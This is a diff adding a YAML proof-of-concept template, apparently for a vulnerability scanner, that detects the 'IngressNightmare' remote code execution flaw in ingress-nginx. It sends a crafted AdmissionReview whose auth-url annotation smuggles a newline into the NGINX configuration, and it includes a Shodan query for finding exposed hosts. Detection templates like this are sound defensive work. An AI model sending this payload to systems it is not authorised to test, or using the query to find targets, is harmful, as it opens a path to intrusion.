@@ -1,0 +1,44 @@
+id: poc-yaml-ingressnightmare-ingress-nginx-unauthorized-rce
+info:
+  name: IngressNightmare Ingress NGINX 未授权远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ingress-nginx
+  shodan: ssl\x3a"Issuer\x3a O=nil1" port\x3a8443 country\x3a"US"
+requests:
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"kind\": \"AdmissionReview\",\n  \"apiVersion\": \"admission.k8s.io/v1\"\
+    ,\n  \"request\": {\n    \"uid\": \"test-uid\",\n    \"kind\": {\n      \"group\"\
+    : \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"kind\": \"Ingress\"\
+    \n    },\n    \"resource\": {\n      \"group\": \"networking.k8s.io\",\n     \
+    \ \"version\": \"v1\",\n      \"resource\": \"ingresses\"\n    },\n    \"requestKind\"\
+    : {\n      \"group\": \"networking.k8s.io\",\n      \"version\": \"v1\",\n   \
+    \   \"kind\": \"Ingress\"\n    },\n    \"requestResource\": {\n      \"group\"\
+    : \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"resource\": \"ingresses\"\
+    \n    },\n    \"name\": \"minimal-ingress\",\n    \"namespace\": \"default\",\n\
+    \    \"operation\": \"CREATE\",\n    \"userInfo\": {\n      \"uid\": \"test-uid\"\
+    \n    },\n    \"object\": {\n      \"kind\": \"Ingress\",\n      \"apiVersion\"\
+    : \"networking.k8s.io/v1\",\n      \"metadata\": {\n        \"name\": \"minimal-ingress\"\
+    ,\n        \"namespace\": \"default\",\n        \"creationTimestamp\": null,\n\
+    \        \"annotations\": {\n          \"nginx.ingress.kubernetes.io/auth-url\"\
+    : \"http://example.com/#;\\nabcd1111111111\"\n        }\n      },\n      \"spec\"\
+    : {\n        \"ingressClassName\": \"nginx\",\n        \"rules\": [\n        \
+    \  {\n            \"host\": \"www.example.com\",\n            \"http\": {\n  \
+    \            \"paths\": [\n                {\n                  \"path\": \"/\"\
+    ,\n                  \"pathType\": \"Prefix\",\n                  \"backend\"\
+    : {\n                    \"service\": {\n                      \"name\": \"kubernetes\"\
+    ,\n                      \"port\": {\n                        \"number\": 443\n\
+    \                      }\n                    }\n                  }\n       \
+    \         }\n              ]\n            }\n          }\n        ]\n      },\n\
+    \      \"status\": {\n        \"loadBalancer\": {}\n      }\n    },\n    \"oldObject\"\
+    : null,\n    \"dryRun\": true,\n    \"options\": {\n      \"kind\": \"CreateOptions\"\
+    ,\n      \"apiVersion\": \"meta.k8s.io/v1\"\n    }\n  }\n}"
+  expression: status_code == 200 && contains(body,"\"uid\"\x3a \"test-uid\"") && contains(body,"\"allowed\"\x3a
+    false") && contains(body,"\"code\"\x3a 400") && contains(body,"\"response\"\x3a
+    {")
+variables: {}
+transport: http
